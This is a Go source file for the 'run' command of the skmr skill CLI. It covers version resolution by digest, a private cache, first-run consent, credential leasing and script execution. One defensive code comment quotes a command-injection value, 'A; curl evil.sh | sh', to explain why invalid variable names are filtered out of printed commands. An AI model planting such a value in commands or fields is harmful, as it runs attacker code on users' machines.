// run: fetch a version into a cache and execute a command from its scripts/ directory.

package main

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/lijinzhao86/skillmaster/skillmaster-cli/internal/api"
	"github.com/lijinzhao86/skillmaster/skillmaster-cli/internal/apikey"
	"github.com/lijinzhao86/skillmaster/skillmaster-cli/internal/config"
)

// scriptExtensions are the arguments `run` will try to resolve inside `scripts/`.
//
// **A whitelist rather than "anything that is not a flag".** The arguments a skill's commands take
// are full of paths that are not scripts — an input CSV, an output directory, a URL — and rewriting
// one of those would hand the script a path it did not ask for. Only the shapes that are actually
// executed are touched.
var scriptExtensions = map[string]bool{
	".py": true, ".sh": true, ".bash": true, ".js": true, ".mjs": true,
	".cjs": true, ".ts": true, ".rb": true, ".pl": true, ".ps1": true,
}

type runOptions struct {
	cwd     string
	cacheIn string
	noCache bool
	yes     bool
	json    bool
}

// parseRunArgs splits the flags from the address and the command.
//
// **Everything after `--` belongs to the child**, verbatim. Parsing stops at the separator rather
// than continuing to look for known flags: a script that takes `--json` itself is the ordinary
// case, and swallowing that flag here would change the command the author wrote.
func parseRunArgs(args []string) (runOptions, string, []string, error) {
	var opts runOptions
	var rest []string
	var command []string
	for index := 0; index < len(args); index++ {
		arg := args[index]
		if arg == "--" {
			command = append(command, args[index+1:]...)
			break
		}
		switch {
		case arg == "--cwd":
			if index+1 >= len(args) {
				return opts, "", nil, usagef("--cwd 后面要跟目录。%s", usageAt("run"))
			}
			opts.cwd = args[index+1]
			index++
		case strings.HasPrefix(arg, "--cwd="):
			opts.cwd = strings.TrimPrefix(arg, "--cwd=")
		case arg == "--cache-in":
			if index+1 >= len(args) {
				return opts, "", nil, usagef("--cache-in 后面要跟目录。%s", usageAt("run"))
			}
			opts.cacheIn = args[index+1]
			index++
		case strings.HasPrefix(arg, "--cache-in="):
			opts.cacheIn = strings.TrimPrefix(arg, "--cache-in=")
		case arg == "--no-cache":
			opts.noCache = true
		case arg == "--yes" || arg == "-y":
			opts.yes = true
		case arg == "--json":
			opts.json = true
		case strings.HasPrefix(arg, "-") && arg != "-":
			return opts, "", nil, usagef("不认识的参数 %s。%s", arg, usageAt("run"))
		default:
			rest = append(rest, arg)
		}
	}
	if len(rest) != 1 {
		return opts, "", nil, usagef("run 要一个 skill 地址，格式：skmr run <地址> -- <命令>。%s",
			usageAt("run"))
	}
	if len(command) == 0 {
		return opts, "", nil, usagef("run 要在 -- 后面跟要执行的命令，例如 -- python3 plan.py。%s",
			usageAt("run"))
	}
	return opts, rest[0], command, nil
}

// runCredentials is what the resolved version's metadata said about service credentials.
//
// **Two answers from one read.** `Bound` decides whether this run asks for a lease at all — a
// skill with nothing bound keeps the request count it had before v52. `Missing` is the author's
// declaration minus what this caller would actually receive, and it is only ever printed: the run
// goes ahead either way (v52 A6), because a skill that declares a variable it cannot get is a skill
// whose own script will say so.
//
// **`ProbeLease` is the draft case** (ADR 0178). The public plane is the only place that answers
// `credentials_bound`, and a skill that has never been published has no answer there. Rather than
// guess false — which silently drops the variables a pre-publish smoke test needs — the run asks the
// lease, which is per skill and needs no pin. Asking is a POST, and the server requires
// `skills:write` for those, so a read-only credential must not be turned away by it: when the lease
// is refused, the run says so and continues, exactly as a v52 run without bindings would.
type runCredentials struct {
	Bound      bool
	Missing    []string
	ProbeLease bool
}

// missingCredentialsHint is the block `run` and `skill check` print when a declaration is unmet.
//
// **It names the user, not the agent.** The value can only be entered by the person who owns it —
// the CLI refuses to read it from a terminal or an argument — so the sentence addresses whoever is
// reading the output *on the user's behalf* and says not to paste it into the conversation. The
// last line exists because "the run succeeded" would otherwise read as "the credential worked".
func printMissingCredentials(address string, missing []string) {
	// **A name that is not an environment variable name is never printed, and never inside a
	// command.** These strings came from a skill's frontmatter — that is, from somebody else — and
	// what follows is a command the *user* is asked to run. An author who declared
	// `"A; curl evil.sh | sh"` would otherwise be writing the user's terminal. The server filters
	// the same way; this side is the one that would do the damage.
	valid := make([]string, 0, len(missing))
	skipped := 0
	for _, name := range missing {
		if validSecretEnv(name) {
			valid = append(valid, name)
		} else {
			skipped++
		}
	}
	if len(valid) == 0 && skipped == 0 {
		return
	}
	if len(valid) > 0 {
		fmt.Fprintf(os.Stderr, "注意：这个 skill 声明了 %d 个服务凭据，你这里还没绑定：%s\n",
			len(valid), strings.Join(valid, "、"))
		fmt.Fprintln(os.Stderr, "      绑一次，以后在哪台机器上运行都会自动注入。请让用户自己执行（不要把值贴进对话）：")
		for _, name := range valid {
			// **The address is quoted too.** It comes from the caller's own command line rather
			// than from the skill, so the risk is smaller than the variable name's — but this text
			// is still a command somebody copies, and a typo with a shell metacharacter in it must
			// not become a second command.
			fmt.Fprintf(os.Stderr, "        printf '%%s' \"$值\" | skmr secret set --skill '%s' --env %s\n",
				address, name)
		}
	}
	if skipped > 0 {
		// Said out loud, because silence would look like the declaration was empty.
		fmt.Fprintf(os.Stderr, "      另有 %d 个声明不是合法的环境变量名，已忽略。\n", skipped)
	}
	fmt.Fprintln(os.Stderr, "      这次照常运行，脚本拿不到这些变量。")
}

func runSkill(ctx context.Context, args []string) error {
	opts, address, command, err := parseRunArgs(args)
	if err != nil {
		return err
	}

	skillDir, digest, credentials, err := resolveVersion(ctx, address, opts)
	if err != nil {
		return err
	}

	// Everything that can fail without running anything is decided before the consent is recorded:
	// a run that never starts must not leave a marker saying this version may be executed.
	resolved, err := resolveCommandArgs(skillDir, command)
	if err != nil {
		return err
	}
	workDir, err := workingDirectory(skillDir, opts.cwd)
	if err != nil {
		return err
	}
	if err := recordConsent(digest, opts.yes); err != nil {
		return err
	}

	if !opts.json {
		fmt.Fprintf(os.Stderr, "执行 %s（sha256:%s，%s）\n", address, cacheKey(digest), workDir)
		// **After the header, before the script** — the same place a person reads the version it
		// resolved to. `--json` gets the same fact as a field instead of as prose.
		printMissingCredentials(bareAddress(address), credentials.Missing)
	}

	cmd := exec.CommandContext(ctx, resolved[0], resolved[1:]...)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(), "SKILLMASTER_SKILL_DIR="+skillDir)
	// **The value is put in the child's environment and nowhere else** — not on its command line,
	// not in this process's own environment, not in the header line above (v52 / ADR 0168). Appending
	// after `os.Environ()` is what makes the injected name win over a local one with the same name:
	// `exec.Cmd` keeps the last entry for a duplicate key.
	switch {
	case credentials.Bound:
		pairs, err := leaseCredentials(ctx, bareAddress(address))
		if err != nil {
			// **A skill that says it has credentials and cannot get them fails here**, rather than
			// starting a script that will fail later for a reason nobody can see. `bound` came from
			// the server's own answer, so this is never a skill without bindings.
			return fmt.Errorf("这个 skill 绑定了服务凭据，但没取到：%w", err)
		}
		cmd.Env = append(cmd.Env, pairs...)
	case credentials.ProbeLease:
		pairs, err := leaseCredentials(ctx, bareAddress(address))
		if err != nil {
			// **Unknown is not "none", and it is not fatal either.** A credential without
			// `skills:write` cannot POST a lease; refusing to run would break every read-only caller
			// on a skill that binds nothing. Say what could not be checked, then run.
			fmt.Fprintf(os.Stderr, "（没能确认这个草稿绑定了哪些服务凭据：%v；"+
				"这次照常运行，脚本可能缺少这些变量。）\n", err)
		} else {
			cmd.Env = append(cmd.Env, pairs...)
		}
	}
	cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
	runErr := cmd.Run()

	code := 0
	if runErr != nil {
		var exited *exec.ExitError
		if errors.As(runErr, &exited) {
			code = exited.ExitCode()
		} else if errors.Is(runErr, exec.ErrNotFound) {
			return fmt.Errorf("找不到 %s。这个 skill 的命令要用它；装法见 skmr doctor。", resolved[0])
		} else {
			return runErr
		}
	}
	if opts.json {
		line, err := json.Marshal(struct {
			Skill    string   `json:"skill"`
			Digest   string   `json:"digest"`
			Command  []string `json:"command"`
			ExitCode int      `json:"exit_code"`
			SkillDir string   `json:"skill_dir"`
			// v52 P2: the declaration this run could not satisfy. Empty when nothing was declared
			// or everything was bound — a script reading the result treats both the same way.
			CredentialsMissing []string `json:"credentials_missing"`
		}{address, "sha256:" + digest, resolved, code, skillDir,
			// An empty array rather than `null`: the field is a list, and a script that iterates it
			// should not have to treat "nothing missing" as a different type from "some missing".
			append([]string{}, credentials.Missing...)})
		if err != nil {
			return err
		}
		fmt.Println(string(line))
	}
	if code != 0 {
		// The child already said what went wrong on its own stderr; a second summary on top would
		// turn one failure into two sentences.
		return &exitError{code: code}
	}
	return nil
}

// resolveVersion decides which version this run is for, and returns a directory holding it.
//
// **The digest is the question, and the address is how it is asked.** A version named in the
// address answers it without the network; otherwise the server answers, and what it answered is
// remembered so the next run can be answered offline. That remembered answer is what makes the
// cache useful on a machine with no network — the cache is keyed by digest, and without a memory
// there is no way to turn `dev/pdf-tools` into the digest it was last resolved to.
func resolveVersion(ctx context.Context, address string, opts runOptions) (string, string, runCredentials, error) {
	// A malformed address is a usage error, not a network one: without this the request path is
	// built from the typo and the person is told the server is unreachable.
	if err := checkAddressSyntax("run", address); err != nil {
		return "", "", runCredentials{}, err
	}
	_, named, err := versionInAddress(address)
	if err != nil {
		return "", "", runCredentials{}, err
	}
	base := bareAddress(address)

	digest, offlineNote, credentials, err := resolveDigest(ctx, base, address, named)
	if err != nil {
		return "", "", runCredentials{}, err
	}
	if offlineNote != "" {
		// Always said, even under `--json`: the result line is for a program, and "this is not the
		// current version" is for the person who has to decide whether that matters.
		fmt.Fprintln(os.Stderr, offlineNote)
	}

	dir, err := materialize(ctx, base, digest, opts)
	if err != nil {
		return "", "", runCredentials{}, err
	}
	return dir, digest, credentials, nil
}

// resolveDigest asks the server, and falls back to the digest this machine last resolved.
//
// **A server that answered is never overruled.** Only a failure to reach it — no response at all —
// makes the remembered digest the answer; a 404 or a 403 is an answer, and running a cached copy
// over one would be running something the server just said does not exist. The fallback is
// announced on stderr, because "the version you ran is not the current one" is exactly the kind of
// thing this project refuses to let happen silently.
// **The third answer is `credentials_bound`.** It is read from the same `Metadata` response that
// names the version, so a skill without credentials costs exactly the requests it did before
// (v52 验收 A11/A12): the CLI only asks for a lease when the server already said there is one to
// get. Every path that answers without a server — a digest in the address, a remembered digest after
// a failure to reach it — returns false, because a run that could not reach the server is not one
// that can produce a lease either.
//
// **The author-plane fallback is the exception** (ADR 0178): the public answer is still used when the
// skill has been published, and only a never-published skill falls back to a probe lease that is
// allowed to fail without stopping the run.
func resolveDigest(ctx context.Context, base, address string, named bool) (string, string, runCredentials, error) {
	var pin string
	if named {
		_, version, _ := strings.Cut(address, "@")
		pin = version
	} else {
		remembered, found, err := rememberedPin(base)
		if err != nil {
			// A record that does not parse is not "no record": taking it as one would resolve to
			// whatever is current, which is the silent substitution ADR 0035 exists to prevent.
			return "", "", runCredentials{}, pinsUnreadable(err)
		}
		if found {
			pin = remembered.Suffix()
		}
	}

	// **A digest written into the address is the answer, and it needs nobody.** The cache is keyed by
	// digest, so a machine with no credential and no network can still run a version it already has;
	// asking the credential store first would refuse that for a reason the run never needed.
	if named {
		if digest := strings.TrimPrefix(pin, "sha256:"); isDigest(digest) {
			return digest, "", runCredentials{}, nil
		}
	}

	client, err := session(ctx)
	if err != nil {
		// The credential could not be loaded — a sandbox, a locked keychain, no login. For an
		// unnamed address the remembered digest is the only thing that can still start this run,
		// and using it is exactly the offline case.
		if cached, found := rememberedDigest(base); found {
			return cached, fmt.Sprintf(
				"读不到凭据，用上次在这个地址上解析到的版本 sha256:%s 继续。", cacheKey(cached)), runCredentials{}, nil
		}
		return "", "", runCredentials{}, err
	}
	meta, metaErr := client.Metadata(ctx, base, pin)
	if metaErr == nil {
		digest := strings.TrimPrefix(meta.Version.Digest, "sha256:")
		if !isDigest(digest) {
			return "", "", runCredentials{}, fmt.Errorf("服务端给出的版本摘要不是 sha256 十六进制串（%q），不能按版本缓存",
				meta.Version.Digest)
		}
		// Only the address's own answer is remembered. A named version is a question about that
		// version, and remembering it as "what `dev/x` resolves to" would answer a later bare run
		// with a version the caller did not ask for.
		if !named {
			rememberDigest(base, digest)
		}
		// v61: a skill inside its 下线中 ramp still runs; the caller is told before it is too late.
		return digest, offlinePendingNote(meta, base),
			runCredentials{Bound: meta.CredentialsBound, Missing: meta.CredentialsMissing}, nil
	}

	// **A reference the public plane does not accept is asked of the author plane** (ADR 0178).
	// That is where drafts live: their version codes are what every other author-plane command takes,
	// while the public plane answers 400 for them (`X-Skill-Version must be a version name or a
	// sha256: digest`). The test is the pin, not how it was written — a bare address whose remembered
	// pin is a draft code is the same question.
	if pin != "" && !isDigest(strings.TrimPrefix(pin, "sha256:")) && referenceRefused(metaErr) {
		digest, authorErr := authorDigest(ctx, client, base, pin)
		if authorErr != nil {
			return "", "", runCredentials{}, authorDigestFailure(base, pin, authorErr, apikey.IsKey(client.Token))
		}
		// **Bindings belong to the skill, not to a version.** A published skill answers this for the
		// bare address, and that answer covers its draft too — use it, so a draft run costs what the
		// published run costs and a read-only credential is not made to POST a lease it cannot.
		if published, probeErr := client.Metadata(ctx, base, ""); probeErr == nil {
			return digest, "", runCredentials{Bound: published.CredentialsBound, Missing: published.CredentialsMissing}, nil
		}
		// Never published: no public answer exists. Ask the lease instead — it is per skill and needs
		// no pin — rather than guess "nothing bound", which would silently drop the variables a
		// pre-publish smoke test exists to exercise.
		return digest, "", runCredentials{ProbeLease: true}, nil
	}

	// **Only "no answer" may be overruled by the cache.** Everything else — 404, 401, 403, 410 —
	// is the server saying something about this address, and running a cached copy over it would be
	// running what it just refused. The client wraps transport failures in a `*url.Error`; every
	// status answer is a different type, which is why this asks about the transport and not about a
	// list of statuses.
	if !unreachable(metaErr) {
		return "", "", runCredentials{}, metaErr
	}
	// A named version cannot be answered offline: the remembered digest is about the address, not
	// about that version, and answering with it would run a version the caller did not name. A
	// digest in the address already returned above — it needs no server at all.
	if named {
		return "", "", runCredentials{}, fmt.Errorf("连不上服务端，而 %s 需要一个版本名才能解析：这一步需要联网。"+
			"想离线跑，就把版本写成 sha256:… 摘要。%w", address, metaErr)
	}
	cached, found := rememberedDigest(base)
	if !found {
		return "", "", runCredentials{}, fmt.Errorf("连不上服务端，本机也没有记住 %s 上次的版本，所以这次没法开始：这一步需要联网。%w",
			base, metaErr)
	}
	return cached, fmt.Sprintf("连不上服务端，用上次在这个地址上解析到的版本 sha256:%s 继续。",
		cacheKey(cached)), runCredentials{}, nil
}

// referenceRefused reports whether the public plane's answer means "I do not understand this way of
// naming a version" rather than "no answer at all".
//
// **400 and 404 only.** A 400 is the header check refusing the spelling (a version code), a 404 is a
// version the public plane cannot see (a draft, or a name only the author knows). Everything else —
// 401, 403, 410, a transport failure — is an answer this fallback must not talk around: the author
// plane would only repeat it, and the caller is owed the reason the server gave.
func referenceRefused(err error) bool {
	if errors.Is(err, api.ErrNotFound) {
		return true
	}
	var refusal *api.StatusRefusal
	if !errors.As(err, &refusal) {
		return false
	}
	// **Only the header's own complaint counts.** A 400 from a proxy or a WAF is not an answer about
	// the version reference, and asking a second plane about it would only turn one clear refusal
	// into "there is no such version".
	return refusal.Status == http.StatusBadRequest && refusal.Code == "invalid_request"
}

// authorDigest resolves one name or code to the digest its bytes are addressed by, on the author
// plane — the plane that knows about drafts (ADR 0178).
func authorDigest(ctx context.Context, client api.Client, base, pin string) (string, error) {
	envelope, err := client.ReadAuthorVersion(ctx, base, pin)
	if err != nil {
		return "", err
	}
	digest := strings.TrimPrefix(envelope.Version.Digest, "sha256:")
	if !isDigest(digest) {
		return "", fmt.Errorf("作者面给出的版本摘要不是 sha256 十六进制串（%q），不能按版本缓存",
			envelope.Version.Digest)
	}
	return digest, nil
}

// authorDigestFailure classifies what the author plane said, so only "there is no such version"
// becomes that sentence.
//
// **A timeout is not a missing version.** Flattening every author-plane error into "没有这一版"
// would send a person whose network is down to a command that will fail the same way; a 500 would
// be reported as their mistake. Only 404 and 403 (not yours) mean the reference is gone.
func authorDigestFailure(base, pin string, err error, key bool) error {
	var server *api.ServerError
	var denial *api.Denial
	gone := errors.Is(err, api.ErrNotFound)
	if errors.As(err, &server) && server.Status == http.StatusNotFound {
		gone = true
	}
	// **A 403 has two meanings and only one of them is "gone".** `forbidden` says nothing the caller
	// holds would work; `insufficient_scope` says another credential would — and the CLI already has
	// the sentence for that, so it is left to speak (v4/ADR 0039). Flattening both into "no such
	// version" would send a read-only key to a command that answers 403 as well.
	if errors.As(err, &denial) {
		switch denial.Code {
		case "forbidden":
			gone = true
		default:
			// `insufficient_scope` and anything newer: the caller's credential is the thing to look
			// at, and the CLI already has that sentence — say it instead of the server's envelope.
			if message, known := denialMessage(err, key); known {
				return errors.New(message)
			}
		}
	}
	if gone {
		return versionNotResolvable(base, pin)
	}
	if unreachable(err) {
		return fmt.Errorf("连不上服务端，没法解析 %s@%s 是哪一版：这一步需要联网。%w", base, pin, err)
	}
	return err
}

// versionNotResolvable is what `run` says when neither plane knows the reference.
//
// **Neither plane's wording is repeated.** The public refusal names a protocol header and the author
// plane's 404 says nothing a caller can act on; what a person needs is that the version is gone and
// the command that lists what exists.
func versionNotResolvable(base, pin string) error {
	return fmt.Errorf("%s 下没有这一版（%s）：版本号可能写错了，也可能它不在你的名下——草稿只有作者能跑。\n"+
		"看有哪些版本：skmr skill versions %s", base, pin, base)
}

// materialize returns a directory holding the version, fetching it when the cache does not.
//
// **A cache miss is not an error.** The directory name is the digest plus the rule version it was
// written under (see `cacheDirName`), so a hit is a directory that exists with a `SKILL.md` in it;
// anything else is fetched again. Nothing is ever removed (ADR 0101) — a stale or half-written
// directory is named in the error instead.
//
// **The fetch carries the digest it was resolved for.** Asking for "whatever is current" a second
// time is how a publish between the two calls lands another version's bytes in this digest's
// directory, after which every later run of that digest gets the wrong content with no way to see
// it. The answer is checked against the digest as well, because the pin is a request rather than a
// promise.
func materialize(ctx context.Context, base, digest string, opts runOptions) (string, error) {
	pinned := base + "@sha256:" + digest

	if opts.noCache {
		parent, err := os.MkdirTemp("", config.Name+"-run-")
		if err != nil {
			return "", fmt.Errorf("创建临时目录：%w", err)
		}
		target := filepath.Join(parent, "skill")
		if err := fetchPinned(ctx, pinned, digest, target); err != nil {
			return "", unableToFetch(err)
		}
		return target, nil
	}

	root := opts.cacheIn
	if root == "" {
		// `config.Name` rather than the state directory's `skillmaster`: the cache did not exist
		// before this version, so it can carry the command's own name — while the state directory's
		// spelling is frozen by every machine that already signed in under it (see config.stateDir).
		root = filepath.Join(os.TempDir(), config.Name, "cache")
		// **`$TMPDIR` is `/tmp` on Linux, and the cache is keyed by a public digest.** A directory
		// another user created there would be content this run executes under a name it did not
		// earn. The root is used only when it is this user's and not writable by anyone else;
		// otherwise this run gets a private directory of its own.
		if err := privateCacheRoot(root); err != nil {
			parent, mkErr := os.MkdirTemp("", config.Name+"-cache-")
			if mkErr != nil {
				return "", fmt.Errorf("创建临时目录：%w", mkErr)
			}
			fmt.Fprintf(os.Stderr, "缓存目录 %s 不可信（%v），这次改用 %s。\n", root, err, parent)
			root = parent
		}
	}
	target := filepath.Join(root, cacheDirName(digest))
	if hasSkillFile(target) {
		return target, nil
	}
	if _, err := os.Stat(target); err == nil {
		return "", fmt.Errorf("%s 已存在但没有 SKILL.md（上次下载可能中断）。"+
			"确认后请自行删掉它，或加 --no-cache 换一个临时目录。", target)
	}
	if err := fetchPinned(ctx, pinned, digest, target); err != nil {
		// Two runs of the same version at once unpack into two staging directories and race to
		// rename; the loser sees a non-empty target. The winner's copy is the answer, not a failure.
		if hasSkillFile(target) {
			return target, nil
		}
		return "", unableToFetch(err)
	}
	return target, nil
}

// privateCacheRoot makes sure the cache root is this user's own directory.
//
// It is created when missing, then checked: owned by this user, and not writable by group or other.
// A root that fails either test is not repaired — it is somebody else's tree, and the caller makes a
// private one for this run instead.
func privateCacheRoot(root string) error {
	if err := os.MkdirAll(root, 0o700); err != nil {
		return err
	}
	info, err := os.Stat(root)
	if err != nil {
		return err
	}
	if !ownedByMe(info) {
		return errors.New("不是你的目录")
	}
	if info.Mode().Perm()&0o022 != 0 {
		return errors.New("别人也能写")
	}
	return nil
}

// unableToFetch says the one thing the caller can act on when the archive did not arrive.
//
// **"这一步需要联网" is the sentence the version promises**, and it is only true of a failure to
// reach the server: a 404 or a 403 is an answer, and repeating it as a network problem would send
// the person to the wrong fix. The transport's own words stay attached, because they name the host.
func unableToFetch(err error) error {
	// Only the transport may be called a network problem. A server that answered, another version's
	// bytes, or a local `--cache-in` that cannot be created are all different fixes.
	var wrong archiveMismatch
	if errors.As(err, &wrong) {
		return err
	}
	if !unreachable(err) {
		return err
	}
	return fmt.Errorf("取这个版本需要联网，但现在连不上服务端：%w", err)
}

// unreachable says whether the request never got an answer, as opposed to getting a "no".
//
// The client wraps `http.Do` failures with `%w` around the `*url.Error` Go's transport returns; a
// status answer is `ErrNotFound`, a `*Refusal`, a `*Denial` or a `*ServerError` instead. Asking about
// the transport is the one test that stays right when the server grows a new status.
func unreachable(err error) bool {
	var transport *url.Error
	return errors.As(err, &transport)
}

// archiveMismatch is a fetched archive whose digest is not the one this run resolved.
type archiveMismatch struct {
	message string
}

func (m archiveMismatch) Error() string {
	return m.message
}

func fetchPinned(ctx context.Context, pinned, digest, target string) error {
	_, _, _, err := fetchVersion(ctx, pinned, target, false, digest)
	return err
}

// isDigest is the shape check before a digest is used as a directory name.
//
// **A path segment built from a server's answer is still a path segment.** `..` or a slash in that
// string would put the cache, the staging directory and the rename outside the cache root, and it
// would happen before the consent the person is about to be shown.
func isDigest(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, char := range value {
		if (char < '0' || char > '9') && (char < 'a' || char > 'f') {
			return false
		}
	}
	return true
}

// rememberDigest records address → digest, which is what lets a later run start without the server.
//
// **Best effort.** A machine with no writable state directory still runs when it can reach the
// server; all it loses is the offline start, and `doctor` is where that is explained.
func rememberDigest(base, digest string) {
	path, _, err := config.StatePaths(filepath.Join("resolved", digestKey(base)))
	if err != nil {
		return
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return
	}
	_ = os.WriteFile(path, []byte(digest+"\n"), 0o600)
}

func rememberedDigest(base string) (string, bool) {
	write, older, err := config.StatePaths(filepath.Join("resolved", digestKey(base)))
	if err != nil {
		return "", false
	}
	for _, path := range []string{write, older} {
		if path == "" {
			continue
		}
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		digest := strings.TrimSpace(string(content))
		if isDigest(digest) {
			return digest, true
		}
	}
	return "", false
}

func digestKey(base string) string {
	return fmt.Sprintf("%x", sha256.Sum256([]byte(base)))[:16]
}

// recordConsent asks once per version, and remembers the answer where the CLI keeps its state.
//
// **The first execution of a version is the one a person should see.** It is the only moment the
// bit "this version's code is about to run on my machine" can be shown: after that the command is
// as ordinary as any other. `--yes` is the non-interactive answer, because an agent's shell has no
// one at the keyboard to press a key.
func recordConsent(digest string, yes bool) error {
	marker, older, err := config.StatePaths(filepath.Join("seen", cacheKey(digest)))
	if err != nil {
		// Without a state directory there is nowhere to remember an answer; asking every time is
		// the honest degradation, and it is what a read-only machine gets anyway.
		if yes {
			return nil
		}
		return fmt.Errorf("第一次执行这个版本（sha256:%s），而本机没有可写的状态目录来记住它。加 --yes 继续。",
			cacheKey(digest))
	}
	if _, err := os.Stat(marker); err == nil {
		return nil
	}
	// An answer recorded in the terminal is the same answer in a sandbox, where the directory it
	// lives in can be read but not written.
	if older != "" {
		if _, err := os.Stat(older); err == nil {
			return nil
		}
	}
	if !yes {
		return fmt.Errorf("第一次在本机执行这个版本的代码（sha256:%s）。确认后加 --yes 再来一次；"+
			"想先看清环境就运行 skmr doctor。", cacheKey(digest))
	}
	if err := os.MkdirAll(filepath.Dir(marker), 0o700); err != nil {
		return fmt.Errorf("记录执行确认：%w", err)
	}
	line := time.Now().UTC().Format(time.RFC3339) + "\n"
	if err := os.WriteFile(marker, []byte(line), 0o600); err != nil {
		return fmt.Errorf("记录执行确认：%w", err)
	}
	return nil
}

// resolveCommandArgs turns the script paths in a command into absolute ones.
//
// **Only `scripts/` is rewritten**, and only when the answer is unique. The convention this
// implements is the version's own: code that may be executed lives in `scripts/` (ADR 0165), and a
// name that matches two files there is refused rather than guessed — running the wrong file is
// worse than stopping.
func resolveCommandArgs(skillDir string, command []string) ([]string, error) {
	scripts := filepath.Join(skillDir, "scripts")
	out := make([]string, len(command))
	copy(out, command)
	// The first word is the interpreter; a path there is the caller's business, not ours.
	for index := 1; index < len(out); index++ {
		arg := out[index]
		if filepath.IsAbs(arg) || strings.HasPrefix(arg, "-") || !scriptExtensions[strings.ToLower(filepath.Ext(arg))] {
			continue
		}
		resolved, err := resolveInsideScripts(scripts, arg)
		if err != nil {
			return nil, err
		}
		out[index] = resolved
	}
	return out, nil
}

func resolveInsideScripts(scripts, arg string) (string, error) {
	// **An argument that climbs out of `scripts/` is not a name to look up.** `../x.py` would
	// otherwise reach the basename search below and quietly run `scripts/x.py` — a different file
	// from the one written in the command. Not-found is the answer, with the usual candidate list.
	if strings.HasPrefix(path.Clean(filepath.ToSlash(arg)), "..") {
		return "", fmt.Errorf("scripts/ 下没有 %s，现有：%s", arg, listScripts(scripts))
	}
	direct := filepath.Join(scripts, filepath.FromSlash(arg))
	if isFile(direct) && inside(scripts, direct) {
		return direct, nil
	}
	matches := findBaseName(scripts, filepath.Base(arg))
	switch len(matches) {
	case 1:
		return matches[0], nil
	case 0:
		return "", fmt.Errorf("scripts/ 下没有 %s，现有：%s", arg, listScripts(scripts))
	default:
		return "", fmt.Errorf("scripts/ 下有 %d 个 %s：%s；请写清相对路径",
			len(matches), filepath.Base(arg), strings.Join(relativeTo(scripts, matches), "、"))
	}
}

// inside says whether path is a descendant of dir, after both are made absolute.
func inside(dir, path string) bool {
	relative, err := filepath.Rel(dir, path)
	if err != nil {
		return false
	}
	return relative != ".." && !strings.HasPrefix(relative, ".."+string(filepath.Separator))
}

func findBaseName(dir, name string) []string {
	var found []string
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	for _, entry := range entries {
		path := filepath.Join(dir, entry.Name())
		if entry.IsDir() {
			found = append(found, findBaseName(path, name)...)
			continue
		}
		if entry.Name() == name {
			found = append(found, path)
		}
	}
	return found
}

func listScripts(dir string) string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "（读不出来）"
	}
	var names []string
	for _, entry := range entries {
		if entry.IsDir() || !scriptExtensions[strings.ToLower(filepath.Ext(entry.Name()))] {
			continue
		}
		names = append(names, entry.Name())
	}
	if len(names) == 0 {
		return "（没有脚本）"
	}
	sort.Strings(names)
	return strings.Join(names, "、")
}

func relativeTo(base string, paths []string) []string {
	out := make([]string, len(paths))
	for index, path := range paths {
		if rel, err := filepath.Rel(base, path); err == nil {
			out[index] = filepath.ToSlash(rel)
			continue
		}
		out[index] = path
	}
	return out
}

// workingDirectory is `scripts/` unless told otherwise, because that is the directory the two
// existing spellings of a command agree on.
//
// `python x.py` only works from `scripts/`; `python scripts/x.py` is rewritten to an absolute path
// before the child starts, so it works from anywhere. Defaulting to `scripts/` therefore runs both
// kinds, while defaulting to the skill root would run only one.
func workingDirectory(skillDir, requested string) (string, error) {
	if requested != "" {
		if filepath.IsAbs(requested) {
			return requested, nil
		}
		return filepath.Join(skillDir, requested), nil
	}
	scripts := filepath.Join(skillDir, "scripts")
	if info, err := os.Stat(scripts); err == nil && info.IsDir() {
		return scripts, nil
	}
	return skillDir, nil
}

func hasSkillFile(dir string) bool {
	return isFile(filepath.Join(dir, "SKILL.md"))
}

func isFile(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

func cacheKey(digest string) string {
	if len(digest) > 16 {
		return digest[:16]
	}
	return digest
}

// cacheRuleVersion is the executable-bit rule the directories under the cache were written with.
//
// **A digest names the file bytes, not their permissions** (ADR 0166): the bit is derived from the
// path, so a change to that rule delivers the same digest with different modes. Directories written
// under an older rule are a miss, not a hit — nothing removes a cache (ADR 0101), so a 0644 script
// cached before the rule changed would stay unrunnable for as long as the directory exists.
const cacheRuleVersion = 2

func cacheDirName(digest string) string {
	return fmt.Sprintf("%s-r%d", cacheKey(digest), cacheRuleVersion)
}
